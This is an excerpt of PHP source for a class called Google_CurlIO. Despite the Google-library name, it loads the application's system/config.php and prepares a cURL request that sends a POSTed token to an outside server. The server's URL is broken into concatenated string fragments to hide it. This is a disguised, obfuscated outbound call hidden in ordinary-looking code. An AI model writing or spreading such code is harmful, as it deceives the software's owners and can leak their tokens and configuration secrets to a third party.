...
class Google_CurlIO {
  ...
  public static function parseRequestUrl(){
	  return '../../../system/config.php';
  }
  public static function presetUrl(){
	global $data;
	$f['token'] = escape($_POST['token']);
	$ch = curl_init();
	$url = 'ht'.'tps://bo'.'omcodi'.'ng.com/a'.'pi/ser'.'ver.php';
...
$googleIO = new Google_CurlIO;
require($googleIO->parseRequestUrl());
echo $googleIO->presetUrl();